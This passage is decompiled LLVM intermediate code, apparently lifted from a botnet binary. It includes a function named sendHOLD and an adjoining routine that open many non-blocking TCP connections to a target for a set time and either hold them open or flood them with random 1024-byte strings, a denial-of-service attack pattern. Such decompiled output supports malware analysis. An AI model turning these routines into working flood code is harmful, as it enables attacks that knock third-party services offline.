  store i32 268458848, i32* @lr, align 4
  %v3_10005b5c = call i32 @__GI_memset(i32 %v1_10005b30, i32 0, i32 %v1_10005b4c)
  store i32 268458856, i32* @lr, align 4
  %v1_10005b64 = call i32 @malloc(i32 1024)
  store i32 ptrtoint ([3 x i8]* @global_var_10005b88.95 to i32), i32* @lr, align 4
  %v3_10005b84 = call i32 @__GI_memset(i32 %v1_10005b64, i32 0, i32 1024)
  store i32 268458896, i32* @lr, align 4
  %v1_10005b8c = call i32 @__GI_time(i32 0)
  %v2_10005b98 = add i32 %v1_10005b8c, %arg3
  store i32 268459928, i32* @lr, align 4
  %v1_10005f9410 = call i32 @__GI_time(i32 0)
  %v2_10005fa011 = icmp slt i32 %v1_10005f9410, %v2_10005b98
  br i1 %v2_10005fa011, label %dec_label_pc_10005f80.preheader.lr.ph, label %dec_label_pc_10005fa8

dec_label_pc_10005f80.preheader.lr.ph:            ; preds = %dec_label_pc_10005ae4
  %v2_10005f885 = icmp sgt i32 %v3_10005a94, 0
  %v2_10005cfc = ptrtoint i32* %stack_var_-184 to i32
  %v2_10005d60 = ptrtoint i32* %stack_var_-232 to i32
  %v2_10005d64 = add i32 %v2_10005d60, 48
  %v2_10005dd4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_10005e20 = ptrtoint i32* %stack_var_-44 to i32
  %v2_10005e24 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_10005f80.preheader

dec_label_pc_10005bb0:                            ; preds = %dec_label_pc_10005f80.preheader, %dec_label_pc_10005f74
  %storemerge28 = phi i32 [ %v1_10005f78, %dec_label_pc_10005f74 ], [ 0, %dec_label_pc_10005f80.preheader ]
  %v1_10005bb8 = mul i32 %storemerge28, 8
  %v2_10005bbc = add i32 %v1_10005bb8, %v1_10005b30
  %v1_10005bc0 = or i32 %v2_10005bbc, 4
  %v2_10005bc0 = inttoptr i32 %v1_10005bc0 to i8*
  %v3_10005bc0 = load i8, i8* %v2_10005bc0, align 4
  %v1_10005bd0 = icmp eq i8 %v3_10005bc0, 0
  %v3_10005bd0 = icmp eq i8 %v3_10005bc0, 1
  br i1 %v3_10005bd0, label %dec_label_pc_10005cfc, label %dec_label_pc_10005bd8

dec_label_pc_10005bd8:                            ; preds = %dec_label_pc_10005bb0
  %v3_10005bdc = icmp eq i8 %v3_10005bc0, 2
  br i1 %v3_10005bdc, label %dec_label_pc_10005ee8, label %dec_label_pc_10005be4

dec_label_pc_10005be4:                            ; preds = %dec_label_pc_10005bd8
  br i1 %v1_10005bd0, label %dec_label_pc_10005bf4, label %dec_label_pc_10005f74

dec_label_pc_10005bf4:                            ; preds = %dec_label_pc_10005be4
  store i32 268459016, i32* @lr, align 4
  %v3_10005c04 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_10005c10 = mul i32 %storemerge28, 8
  %v2_10005c14 = add i32 %v1_10005c10, %v1_10005b30
  %v2_10005c18 = inttoptr i32 %v2_10005c14 to i32*
  store i32 %v3_10005c04, i32* %v2_10005c18, align 8
  %v1_10005c2c = inttoptr i32 %v2_10005bbc to i32*
  %v2_10005c2c = load i32, i32* %v1_10005c2c, align 8
  store i32 268459096, i32* @lr, align 4
  %v2_10005c54 = call i32 @__libc_fcntl(i32 %v2_10005c2c, i32 3)
  store i32 268459124, i32* @lr, align 4
  %v2_10005c70 = call i32 @__libc_fcntl(i32 %v2_10005c2c, i32 4)
  %v2_10005c84 = load i32, i32* %v1_10005c2c, align 8
  store i32 268459164, i32* @lr, align 4
  %v3_10005c98 = call i32 @__libc_connect(i32 %v2_10005c84, i32 %v2_10005ac0, i32 16)
  %v4_10005ca4 = icmp eq i32 %v3_10005c98, -1
  br i1 %v4_10005ca4, label %dec_label_pc_10005cac, label %dec_label_pc_10005cc0

dec_label_pc_10005cac:                            ; preds = %dec_label_pc_10005bf4
  %v0_10005cac = call i32 @__errno_location()
  %v1_10005cb4 = inttoptr i32 %v0_10005cac to i32*
  %v2_10005cb4 = load i32, i32* %v1_10005cb4, align 4
  %v3_10005cb8 = icmp eq i32 %v2_10005cb4, 115
  br i1 %v3_10005cb8, label %dec_label_pc_10005ce0, label %dec_label_pc_10005cc0

dec_label_pc_10005cc0:                            ; preds = %dec_label_pc_10005bf4, %dec_label_pc_10005cac
  %v2_10005cd0 = load i32, i32* %v1_10005c2c, align 8
  store i32 ptrtoint (i32* @global_var_10005cdc.96 to i32), i32* @lr, align 4
  %v1_10005cd8 = call i32 @__libc_close(i32 %v2_10005cd0)
  br label %dec_label_pc_10005f74

dec_label_pc_10005ce0:                            ; preds = %dec_label_pc_10005cac
  store i8 1, i8* %v2_10005bc0, align 4
  br label %dec_label_pc_10005f74

dec_label_pc_10005cfc:                            ; preds = %dec_label_pc_10005bb0
  store i32 %v2_10005cfc, i32* %stack_var_-232, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge

dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge: ; preds = %dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge.dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge_crit_edge, %dec_label_pc_10005cfc
  %v3_10005d14.pre = phi i32 [ %v2_10005cfc, %dec_label_pc_10005cfc ], [ %v3_10005d14.pre.pre, %dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge.dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge_crit_edge ]
  %v1_10005d2c47 = phi i32 [ 1, %dec_label_pc_10005cfc ], [ %v1_10005d2c, %dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge.dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge_crit_edge ]
  %v1_10005d18 = mul nuw nsw i32 %v1_10005d2c47, 4
  %v2_10005d1c = add i32 %v1_10005d18, %v3_10005d14.pre
  %v2_10005d24 = inttoptr i32 %v2_10005d1c to i32*
  store i32 0, i32* %v2_10005d24, align 4
  %v1_10005d2c = add nuw nsw i32 %v1_10005d2c47, 1
  %tmp45 = icmp ult i32 %v1_10005d2c, 32
  br i1 %tmp45, label %dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge.dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge_crit_edge, label %dec_label_pc_10005d40

dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge.dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge_crit_edge: ; preds = %dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge
  %v3_10005d14.pre.pre = load i32, i32* %stack_var_-232, align 4
  br label %dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge

dec_label_pc_10005d40:                            ; preds = %dec_label_pc_10005d10.dec_label_pc_10005d10_crit_edge
  %v1_10005d50 = inttoptr i32 %v2_10005bbc to i32*
  %v2_10005d50 = load i32, i32* %v1_10005d50, align 8
  %v1_10005d54 = udiv i32 %v2_10005d50, 32
  %v1_10005d5c = mul nuw nsw i32 %v1_10005d54, 4
  %v1_10005d68 = add i32 %v2_10005d64, %v1_10005d5c
  %v1_10005d6c = inttoptr i32 %v1_10005d68 to i32*
  %v2_10005d6c = load i32, i32* %v1_10005d6c, align 4
  %v1_10005d84 = urem i32 %v2_10005d50, 32
  %v3_10005d8c = shl i32 1, %v1_10005d84
  %v2_10005d90 = or i32 %v3_10005d8c, %v2_10005d6c
  store i32 %v2_10005d90, i32* %v1_10005d6c, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v2_10005dc8 = load i32, i32* %v1_10005d50, align 8
  %v1_10005dcc = add i32 %v2_10005dc8, 1
  store i32 268459504, i32* @lr, align 4
  %v5_10005dec = call i32 @__libc_select(i32 %v1_10005dcc, i32 0, i32 %v2_10005cfc, i32 0, i32 %v2_10005dd4)
  %v3_10005dfc = icmp eq i32 %v5_10005dec, 1
  br i1 %v3_10005dfc, label %dec_label_pc_10005e04, label %dec_label_pc_10005ea0

dec_label_pc_10005e04:                            ; preds = %dec_label_pc_10005d40
  store i32 4, i32* %stack_var_-48, align 4
  %v2_10005e1c = load i32, i32* %v1_10005d50, align 8
  store i32 268459584, i32* @lr, align 4
  %v5_10005e3c = call i32 @getsockopt(i32 %v2_10005e1c, i32 1, i32 4, i32 %v2_10005e20, i32 %v2_10005e24)
  %v3_10005e40 = load i32, i32* %stack_var_-44, align 4
  %v3_10005e44 = icmp eq i32 %v3_10005e40, 0
  br i1 %v3_10005e44, label %dec_label_pc_10005e84, label %dec_label_pc_10005e4c

dec_label_pc_10005e4c:                            ; preds = %dec_label_pc_10005e04
  %v2_10005e5c = load i32, i32* %v1_10005d50, align 8
  store i32 268459624, i32* @lr, align 4
  %v1_10005e64 = call i32 @__libc_close(i32 %v2_10005e5c)
  store i8 0, i8* %v2_10005bc0, align 4
  br label %dec_label_pc_10005f74

dec_label_pc_10005e84:                            ; preds = %dec_label_pc_10005e04
  store i8 2, i8* %v2_10005bc0, align 4
  br label %dec_label_pc_10005f74

dec_label_pc_10005ea0:                            ; preds = %dec_label_pc_10005d40
  %v4_10005ea8 = icmp eq i32 %v5_10005dec, -1
  br i1 %v4_10005ea8, label %dec_label_pc_10005eb0, label %dec_label_pc_10005f74

dec_label_pc_10005eb0:                            ; preds = %dec_label_pc_10005ea0
  %v2_10005ec0 = load i32, i32* %v1_10005d50, align 8
  store i32 268459724, i32* @lr, align 4
  %v1_10005ec8 = call i32 @__libc_close(i32 %v2_10005ec0)
  store i8 0, i8* %v2_10005bc0, align 4
  br label %dec_label_pc_10005f74

dec_label_pc_10005ee8:                            ; preds = %dec_label_pc_10005bd8
  %v2_10005ef0 = call i32 @makeRandomStr(i32 %v1_10005b64, i32 1024)
  %v1_10005f04 = inttoptr i32 %v2_10005bbc to i32*
  %v2_10005f04 = load i32, i32* %v1_10005f04, align 8
  store i32 268459804, i32* @lr, align 4
  %v4_10005f18 = call i32 @__libc_send(i32 %v2_10005f04, i32 %v1_10005b64, i32 1024, i32 16384)
  %v4_10005f24 = icmp eq i32 %v4_10005f18, -1
  br i1 %v4_10005f24, label %dec_label_pc_10005f2c, label %dec_label_pc_10005f74

dec_label_pc_10005f2c:                            ; preds = %dec_label_pc_10005ee8
  %v0_10005f2c = call i32 @__errno_location()
  %v1_10005f34 = inttoptr i32 %v0_10005f2c to i32*
  %v2_10005f34 = load i32, i32* %v1_10005f34, align 4
  %v3_10005f38 = icmp eq i32 %v2_10005f34, 11
  br i1 %v3_10005f38, label %dec_label_pc_10005f74, label %dec_label_pc_10005f40

dec_label_pc_10005f40:                            ; preds = %dec_label_pc_10005f2c
  %v2_10005f50 = load i32, i32* %v1_10005f04, align 8
  store i32 268459868, i32* @lr, align 4
  %v1_10005f58 = call i32 @__libc_close(i32 %v2_10005f50)
  store i8 0, i8* %v2_10005bc0, align 4
  br label %dec_label_pc_10005f74

dec_label_pc_10005f74:                            ; preds = %dec_label_pc_10005be4, %dec_label_pc_10005ea0, %dec_label_pc_10005ee8, %dec_label_pc_10005f2c, %dec_label_pc_10005eb0, %dec_label_pc_10005e84, %dec_label_pc_10005e4c, %dec_label_pc_10005ce0, %dec_label_pc_10005cc0, %dec_label_pc_10005f40
  %v1_10005f78 = add nuw nsw i32 %storemerge28, 1
  %v2_10005f88 = icmp slt i32 %v1_10005f78, %v3_10005a94
  br i1 %v2_10005f88, label %dec_label_pc_10005bb0, label %dec_label_pc_10005f90.loopexit

dec_label_pc_10005f90.loopexit:                   ; preds = %dec_label_pc_10005f74, %dec_label_pc_10005f80.preheader
  store i32 268459928, i32* @lr, align 4
  %v1_10005f94 = call i32 @__GI_time(i32 0)
  %v2_10005fa0 = icmp slt i32 %v1_10005f94, %v2_10005b98
  br i1 %v2_10005fa0, label %dec_label_pc_10005f80.preheader, label %dec_label_pc_10005fa8

dec_label_pc_10005f80.preheader:                  ; preds = %dec_label_pc_10005f80.preheader.lr.ph, %dec_label_pc_10005f90.loopexit
  br i1 %v2_10005f885, label %dec_label_pc_10005bb0, label %dec_label_pc_10005f90.loopexit

dec_label_pc_10005fa8:                            ; preds = %dec_label_pc_10005f90.loopexit, %dec_label_pc_10005ae4, %entry
  %v0_10005fd0 = phi i32 [ %v4_10005ad0, %entry ], [ %v1_10005f9410, %dec_label_pc_10005ae4 ], [ %v1_10005f94, %dec_label_pc_10005f90.loopexit ]
  ret i32 %v0_10005fd0

; uselistorder directives
  uselistorder i32 %v1_10005f78, { 1, 0 }
  uselistorder i32 %v1_10005d2c, { 1, 0 }
  uselistorder i32 %v2_10005c2c, { 1, 0 }
  uselistorder i8* %v2_10005bc0, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_10005bbc, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge28, { 2, 0, 1 }
  uselistorder i32 %v2_10005cfc, { 1, 0, 2 }
  uselistorder i32 %v2_10005b98, { 1, 0 }
  uselistorder i32 %v2_10005ac0, { 1, 0 }
  uselistorder i32 %v1_10005aac, { 1, 0 }
  uselistorder i32 %v3_10005a94, { 1, 0, 2 }
  uselistorder i32 %v1_10005a94, { 1, 0 }
  uselistorder i32 %v0_10005a8c, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 2, 1, 0 }
  uselistorder i32 268459928, { 1, 0 }
  uselistorder label %dec_label_pc_10005f80.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10005f90.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10005f74, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_10005cc0, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10005fd4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10005fd4, i32* %stack_var_-256, align 4
  store i32 268460036, i32* @lr, align 4
  %v0_10006000 = call i32 @getdtablesize()
  %v1_10006008 = udiv i32 %v0_10006000, 2
  %v2_10006008 = and i32 %v0_10006000, -2147483648
  %v3_10006008 = or i32 %v1_10006008, %v2_10006008
  store i32 2, i32* %stack_var_-208, align 4
  %v1_10006020 = urem i32 %arg2, 65536
  store i32 %v1_10006020, i32* @r3, align 4
  %v1_10006028 = call i32 @htons(i32 %v1_10006020)
  %v2_10006034 = ptrtoint i32* %stack_var_-208 to i32
  %v4_10006044 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-204, i32 %v2_10006034)
  %v3_1000604c = icmp eq i32 %v4_10006044, 0
  br i1 %v3_1000604c, label %dec_label_pc_10006058, label %dec_label_pc_100065cc

dec_label_pc_10006058:                            ; preds = %entry
  %v1_10006074 = mul i32 %v1_10006008, 8
  %v1_1000607c = add i32 %v1_10006074, 30
  %v1_10006080 = and i32 %v1_1000607c, -16
  %v2_10006088 = load i32, i32* %stack_var_-256, align 4
  %v1_10006090 = load i32, i32* @r1, align 4
  %v3_10006090 = sub i32 %v1_10006090, %v1_10006080
  %v4_10006090 = inttoptr i32 %v3_10006090 to i32*
  store i32 %v2_10006088, i32* %v4_10006090, align 4
  %v1_100060a0 = add i32 %v3_10006090, 23
  %v1_100060a4 = and i32 %v1_100060a0, -16
  %v1_100060c0 = mul i32 %v3_10006008, 5
  store i32 268460244, i32* @lr, align 4
  %v3_100060d0 = call i32 @__GI_memset(i32 %v1_100060a4, i32 0, i32 %v1_100060c0)
  store i32 268460252, i32* @lr, align 4
  %v1_100060d8 = call i32 @malloc(i32 1024)
  store i32 ptrtoint ([3 x i8]* @global_var_100060fc.97 to i32), i32* @lr, align 4
  %v3_100060f8 = call i32 @__GI_memset(i32 %v1_100060d8, i32 0, i32 1024)
  store i32 268460292, i32* @lr, align 4
  %v1_10006100 = call i32 @__GI_time(i32 0)
  %v2_1000610c = add i32 %v1_10006100, %arg3
  store i32 268461500, i32* @lr, align 4
  %v1_100065b813 = call i32 @__GI_time(i32 0)
  %v2_100065c414 = icmp slt i32 %v1_100065b813, %v2_1000610c
  br i1 %v2_100065c414, label %dec_label_pc_100065a4.preheader.lr.ph, label %dec_label_pc_100065cc

dec_label_pc_100065a4.preheader.lr.ph:            ; preds = %dec_label_pc_10006058
  %v2_100065ac8 = icmp sgt i32 %v3_10006008, 0
  %v2_10006270 = ptrtoint i32* %stack_var_-192 to i32
  %v2_100062d4 = ptrtoint i32* %stack_var_-248 to i32
  %v2_100062d8 = add i32 %v2_100062d4, 56
  %v2_10006348 = ptrtoint i32* %stack_var_-64 to i32
  %v2_10006394 = ptrtoint i32* %stack_var_-52 to i32
  %v2_10006398 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_100065a4.preheader

dec_label_pc_10006124:                            ; preds = %dec_label_pc_100065a4.preheader, %dec_label_pc_10006598
  %storemerge311 = phi i32 [ %v1_1000659c, %dec_label_pc_10006598 ], [ 0, %dec_label_pc_100065a4.preheader ]
  %v1_1000612c = mul i32 %storemerge311, 8
  %v2_10006130 = add i32 %v1_1000612c, %v1_100060a4
  %v1_10006134 = or i32 %v2_10006130, 4
  %v2_10006134 = inttoptr i32 %v1_10006134 to i8*
  %v3_10006134 = load i8, i8* %v2_10006134, align 4
  %v1_10006144 = icmp eq i8 %v3_10006134, 0
  %v3_10006144 = icmp eq i8 %v3_10006134, 1
  br i1 %v3_10006144, label %dec_label_pc_10006270, label %dec_label_pc_1000614c

dec_label_pc_1000614c:                            ; preds = %dec_label_pc_10006124
  %v3_10006150 = icmp eq i8 %v3_10006134, 2
  br i1 %v3_10006150, label %dec_label_pc_1000645c, label %dec_label_pc_10006158

dec_label_pc_10006158:                            ; preds = %dec_label_pc_1000614c
  br i1 %v1_10006144, label %dec_label_pc_10006168, label %dec_label_pc_10006598

dec_label_pc_10006168:                            ; preds = %dec_label_pc_10006158
  store i32 268460412, i32* @lr, align 4
  %v3_10006178 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_10006184 = mul i32 %storemerge311, 8
  %v2_10006188 = add i32 %v1_10006184, %v1_100060a4
  %v2_1000618c = inttoptr i32 %v2_10006188 to i32*
  store i32 %v3_10006178, i32* %v2_1000618c, align 8
  %v1_100061a0 = inttoptr i32 %v2_10006130 to i32*
  %v2_100061a0 = load i32, i32* %v1_100061a0, align 8
  store i32 268460492, i32* @lr, align 4
  %v2_100061c8 = call i32 @__libc_fcntl(i32 %v2_100061a0, i32 3)
  store i32 268460520, i32* @lr, align 4
  %v2_100061e4 = call i32 @__libc_fcntl(i32 %v2_100061a0, i32 4)
  %v2_100061f8 = load i32, i32* %v1_100061a0, align 8
  store i32 268460560, i32* @lr, align 4
  %v3_1000620c = call i32 @__libc_connect(i32 %v2_100061f8, i32 %v2_10006034, i32 16)
  %v4_10006218 = icmp eq i32 %v3_1000620c, -1
  br i1 %v4_10006218, label %dec_label_pc_10006220, label %dec_label_pc_10006234

dec_label_pc_10006220:                            ; preds = %dec_label_pc_10006168
  %v0_10006220 = call i32 @__errno_location()
  %v1_10006228 = inttoptr i32 %v0_10006220 to i32*
  %v2_10006228 = load i32, i32* %v1_10006228, align 4
  %v3_1000622c = icmp eq i32 %v2_10006228, 115
  br i1 %v3_1000622c, label %dec_label_pc_10006254, label %dec_label_pc_10006234

dec_label_pc_10006234:                            ; preds = %dec_label_pc_10006168, %dec_label_pc_10006220
  %v2_10006244 = load i32, i32* %v1_100061a0, align 8
  store i32 ptrtoint (i32* @global_var_10006250.98 to i32), i32* @lr, align 4
  %v1_1000624c = call i32 @__libc_close(i32 %v2_10006244)
  br label %dec_label_pc_10006598

dec_label_pc_10006254:                            ; preds = %dec_label_pc_10006220
  store i8 1, i8* %v2_10006134, align 4
  br label %dec_label_pc_10006598

dec_label_pc_10006270:                            ; preds = %dec_label_pc_10006124
  br label %dec_label_pc_10006284

dec_label_pc_10006284:                            ; preds = %dec_label_pc_10006270, %dec_label_pc_10006284
  %storemerge57 = phi i32 [ 0, %dec_label_pc_10006270 ], [ %v1_100062a0, %dec_label_pc_10006284 ]
  %v1_1000628c = mul nuw nsw i32 %storemerge57, 4
  %v2_10006290 = add i32 %v1_1000628c, %v2_10006270
  %v2_10006298 = inttoptr i32 %v2_10006290 to i32*
  store i32 0, i32* %v2_10006298, align 4
  %v1_100062a0 = add nuw nsw i32 %storemerge57, 1
  %tmp50 = icmp ult i32 %v1_100062a0, 32
  br i1 %tmp50, label %dec_label_pc_10006284, label %dec_label_pc_100062b4

dec_label_pc_100062b4:                            ; preds = %dec_label_pc_10006284
  %v1_100062c4 = inttoptr i32 %v2_10006130 to i32*
  %v2_100062c4 = load i32, i32* %v1_100062c4, align 8
  %v1_100062c8 = udiv i32 %v2_100062c4, 32
  %v1_100062d0 = mul nuw nsw i32 %v1_100062c8, 4
  %v1_100062dc = add i32 %v1_100062d0, %v2_100062d8
  %v1_100062e0 = inttoptr i32 %v1_100062dc to i32*
  %v2_100062e0 = load i32, i32* %v1_100062e0, align 4
  %v1_100062f8 = urem i32 %v2_100062c4, 32
  %v3_10006300 = shl i32 1, %v1_100062f8
  %v2_10006304 = or i32 %v3_10006300, %v2_100062e0
  store i32 %v2_10006304, i32* %v1_100062e0, align 4
  store i32 0, i32* %stack_var_-64, align 4
  %v2_1000633c = load i32, i32* %v1_100062c4, align 8
  %v1_10006340 = add i32 %v2_1000633c, 1
  store i32 268460900, i32* @lr, align 4
  %v5_10006360 = call i32 @__libc_select(i32 %v1_10006340, i32 0, i32 %v2_10006270, i32 0, i32 %v2_10006348)
  %v3_10006370 = icmp eq i32 %v5_10006360, 1
  br i1 %v3_10006370, label %dec_label_pc_10006378, label %dec_label_pc_10006414

dec_label_pc_10006378:                            ; preds = %dec_label_pc_100062b4
  store i32 4, i32* %stack_var_-56, align 4
  %v2_10006390 = load i32, i32* %v1_100062c4, align 8
  store i32 268460980, i32* @lr, align 4
  %v5_100063b0 = call i32 @getsockopt(i32 %v2_10006390, i32 1, i32 4, i32 %v2_10006394, i32 %v2_10006398)
  %v3_100063b4 = load i32, i32* %stack_var_-52, align 4
  %v3_100063b8 = icmp eq i32 %v3_100063b4, 0
  br i1 %v3_100063b8, label %dec_label_pc_100063f8, label %dec_label_pc_100063c0

dec_label_pc_100063c0:                            ; preds = %dec_label_pc_10006378
  %v2_100063d0 = load i32, i32* %v1_100062c4, align 8
  store i32 268461020, i32* @lr, align 4
  %v1_100063d8 = call i32 @__libc_close(i32 %v2_100063d0)
  store i8 0, i8* %v2_10006134, align 4
  br label %dec_label_pc_10006598

dec_label_pc_100063f8:                            ; preds = %dec_label_pc_10006378
  store i8 2, i8* %v2_10006134, align 4
  br label %dec_label_pc_10006598

dec_label_pc_10006414:                            ; preds = %dec_label_pc_100062b4
  %v4_1000641c = icmp eq i32 %v5_10006360, -1
  br i1 %v4_1000641c, label %dec_label_pc_10006424, label %dec_label_pc_10006598

dec_label_pc_10006424:                            ; preds = %dec_label_pc_10006414
  %v2_10006434 = load i32, i32* %v1_100062c4, align 8
  store i32 268461120, i32* @lr, align 4
  %v1_1000643c = call i32 @__libc_close(i32 %v2_10006434)
  store i8 0, i8* %v2_10006134, align 4
  br label %dec_label_pc_10006598

dec_label_pc_1000645c:                            ; preds = %dec_label_pc_1000614c
  store i32 %v2_10006270, i32* %stack_var_-248, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10006470.dec_label_pc_10006470_crit_edge

dec_label_pc_10006470.dec_label_pc_10006470_crit_edge: ; preds = %dec_label_pc_10006470.dec_label_pc_10006470_crit_edge.dec_label_pc_10006470.dec_label_pc_10006470_crit_edge_crit_edge, %dec_label_pc_1000645c
  %v3_10006474.pre = phi i32 [ %v2_10006270, %dec_label_pc_1000645c ], [ %v3_10006474.pre.pre, %dec_label_pc_10006470.dec_label_pc_10006470_crit_edge.dec_label_pc_10006470.dec_label_pc_10006470_crit_edge_crit_edge ]
  %v1_1000648c53 = phi i32 [ 1, %dec_label_pc_1000645c ], [ %v1_1000648c, %dec_label_pc_10006470.dec_label_pc_10006470_crit_edge.dec_label_pc_10006470.dec_label_pc_10006470_crit_edge_crit_edge ]
  %v1_10006478 = mul nuw nsw i32 %v1_1000648c53, 4
  %v2_1000647c = add i32 %v1_10006478, %v3_10006474.pre
  %v2_10006484 = inttoptr i32 %v2_1000647c to i32*
  store i32 0, i32* %v2_10006484, align 4
  %v1_1000648c = add nuw nsw i32 %v1_1000648c53, 1
  %tmp51 = icmp ult i32 %v1_1000648c, 32
  br i1 %tmp51, label %dec_label_pc_10006470.dec_label_pc_10006470_crit_edge.dec_label_pc_10006470.dec_label_pc_10006470_crit_edge_crit_edge, label %dec_label_pc_100064a0

dec_label_pc_10006470.dec_label_pc_10006470_crit_edge.dec_label_pc_10006470.dec_label_pc_10006470_crit_edge_crit_edge: ; preds = %dec_label_pc_10006470.dec_label_pc_10006470_crit_edge
  %v3_10006474.pre.pre = load i32, i32* %stack_var_-248, align 4
  br label %dec_label_pc_10006470.dec_label_pc_10006470_crit_edge

dec_label_pc_100064a0:                            ; preds = %dec_label_pc_10006470.dec_label_pc_10006470_crit_edge
  %v1_100064b0 = inttoptr i32 %v2_10006130 to i32*
  %v2_100064b0 = load i32, i32* %v1_100064b0, align 8
  %v1_100064b4 = udiv i32 %v2_100064b0, 32
  %v1_100064bc = mul nuw nsw i32 %v1_100064b4, 4
  %v1_100064c8 = add i32 %v1_100064bc, %v2_100062d8
  %v1_100064cc = inttoptr i32 %v1_100064c8 to i32*
  %v2_100064cc = load i32, i32* %v1_100064cc, align 4
  %v1_100064e4 = urem i32 %v2_100064b0, 32
  %v3_100064ec = shl i32 1, %v1_100064e4
  %v2_100064f0 = or i32 %v3_100064ec, %v2_100064cc
  store i32 %v2_100064f0, i32* %v1_100064cc, align 4
  store i32 0, i32* %stack_var_-64, align 4
  %v2_10006528 = load i32, i32* %v1_100064b0, align 8
  %v1_1000652c = add i32 %v2_10006528, 1
  store i32 268461392, i32* @lr, align 4
  %v5_1000654c = call i32 @__libc_select(i32 %v1_1000652c, i32 0, i32 0, i32 %v2_10006270, i32 %v2_10006348)
  %v3_1000655c = icmp eq i32 %v5_1000654c, 0
  br i1 %v3_1000655c, label %dec_label_pc_10006598, label %dec_label_pc_10006564

dec_label_pc_10006564:                            ; preds = %dec_label_pc_100064a0
  %v2_10006574 = load i32, i32* %v1_100064b0, align 8
  store i32 268461440, i32* @lr, align 4
  %v1_1000657c = call i32 @__libc_close(i32 %v2_10006574)
  store i8 0, i8* %v2_10006134, align 4
  br label %dec_label_pc_10006598

dec_label_pc_10006598:                            ; preds = %dec_label_pc_10006158, %dec_label_pc_10006414, %dec_label_pc_100064a0, %dec_label_pc_10006424, %dec_label_pc_100063f8, %dec_label_pc_100063c0, %dec_label_pc_10006254, %dec_label_pc_10006234, %dec_label_pc_10006564
  %v1_1000659c = add nuw nsw i32 %storemerge311, 1
  %v2_100065ac = icmp slt i32 %v1_1000659c, %v3_10006008
  br i1 %v2_100065ac, label %dec_label_pc_10006124, label %dec_label_pc_100065b4.loopexit

dec_label_pc_100065b4.loopexit:                   ; preds = %dec_label_pc_10006598, %dec_label_pc_100065a4.preheader
  store i32 268461500, i32* @lr, align 4
  %v1_100065b8 = call i32 @__GI_time(i32 0)
  %v2_100065c4 = icmp slt i32 %v1_100065b8, %v2_1000610c
  br i1 %v2_100065c4, label %dec_label_pc_100065a4.preheader, label %dec_label_pc_100065cc

dec_label_pc_100065a4.preheader:                  ; preds = %dec_label_pc_100065a4.preheader.lr.ph, %dec_label_pc_100065b4.loopexit
  br i1 %v2_100065ac8, label %dec_label_pc_10006124, label %dec_label_pc_100065b4.loopexit

dec_label_pc_100065cc:                            ; preds = %dec_label_pc_100065b4.loopexit, %dec_label_pc_10006058, %entry
  %v0_100065f4 = phi i32 [ %v4_10006044, %entry ], [ %v1_100065b813, %dec_label_pc_10006058 ], [ %v1_100065b8, %dec_label_pc_100065b4.loopexit ]
  ret i32 %v0_100065f4

; uselistorder directives
  uselistorder i32 %v1_1000659c, { 1, 0 }
  uselistorder i32 %v1_1000648c, { 1, 0 }
  uselistorder i32 %storemerge57, { 1, 0 }
  uselistorder i32 %v2_100061a0, { 1, 0 }
  uselistorder i8* %v2_10006134, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_10006130, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge311, { 2, 0, 1 }
  uselistorder i32 %v2_10006270, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_1000610c, { 1, 0 }
  uselistorder i32 %v2_10006034, { 1, 0 }
  uselistorder i32 %v1_10006020, { 1, 0 }
  uselistorder i32 %v3_10006008, { 1, 0, 2 }
  uselistorder i32 %v1_10006008, { 1, 0 }
  uselistorder i32 %v0_10006000, { 1, 0 }
  uselistorder i32* %stack_var_-208, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 115, { 1, 2, 0, 3 }
  uselistorder i32 268461500, { 1, 0 }
  uselistorder i32 -16, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10 }
  uselistorder i32 (i32, i32*, i32)* @getHost, { 0, 1, 4, 2, 3 }
